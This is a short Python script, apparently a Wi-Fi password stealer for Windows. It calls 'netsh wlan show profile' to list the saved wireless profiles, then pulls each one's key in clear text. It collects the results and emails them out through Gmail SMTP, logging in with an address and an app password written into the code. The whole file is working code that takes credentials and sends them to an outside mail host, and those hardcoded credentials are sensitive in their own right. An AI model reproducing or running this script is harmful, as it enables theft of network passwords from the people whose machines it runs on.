import subprocess
import smtplib
import re

def send_mail(email, password, message):
    with smtplib.SMTP("smtp.gmail.com", 587) as connection:
        connection.starttls()
        connection.login(user=email, password=password)
        connection.sendmail(email, email, message)

command = "netsh wlan show profile"
network_profiles = subprocess.check_output(command, shell=True).decode('utf-8')  # Decode the bytes to a string
# print(network_profiles)
network_profiles_sort = re.findall(r"(?:Profile\s*:\s*)(.+)", network_profiles)

result = ""
# Print the extracted profile names
for profile_name in network_profiles_sort:
    print(profile_name)
    command = f'netsh wlan show profile "{profile_name}" key=clear'

    message = subprocess.check_output(command, shell=True).decode('utf-8')
    result = result + message

    print(message)
send_mail("demo8552051878@gmail.com", "yojwiabucqzxammo", result)










